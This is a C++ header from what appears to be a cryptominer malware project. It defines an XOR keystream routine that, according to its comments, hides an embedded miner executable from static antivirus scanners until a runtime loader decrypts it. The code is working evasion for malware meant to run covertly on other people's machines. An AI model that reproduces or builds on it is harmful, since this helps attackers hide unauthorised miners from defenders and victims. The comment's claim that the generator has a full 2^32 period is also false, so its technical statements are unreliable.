// payload_crypto.h
#pragma once
#include <cstdint>
#include <cstddef>

// Symmetric keystream transform for embedded miner payloads. The client must
// never carry the raw miner PE bytes in .rsrc: static scanners match them
// verbatim. This transform is applied at build time (payload_encryptor tool)
// and replayed identically by the runtime loader, so the resource section
// only ever holds ciphertext that no longer resembles the on-disk payload.
//
// The keystream is a stateful 32-bit LCG (full period 2^32, so no repeating
// byte runs) seeded from a compile-time constant. XOR is symmetric: applying
// it twice restores the original bytes. All arithmetic is defined on uint32,
// so encryptor and decryptor stay in lockstep regardless of toolchain.

static constexpr uint32_t PAYLOAD_XOR_KEY = 0xC5E12F4Bu;

static inline uint32_t PayloadKeystreamStep(uint32_t s)
{
    return s * 0x01000193u + 0x9E3779B9u;
}

static inline void PayloadCryptoXor(uint8_t* data, std::size_t size)
{
    uint32_t state = PAYLOAD_XOR_KEY;
    for (std::size_t i = 0; i < size; ++i)
    {
        state = PayloadKeystreamStep(state);
        data[i] ^= static_cast<uint8_t>(state & 0xFFu);
    }
}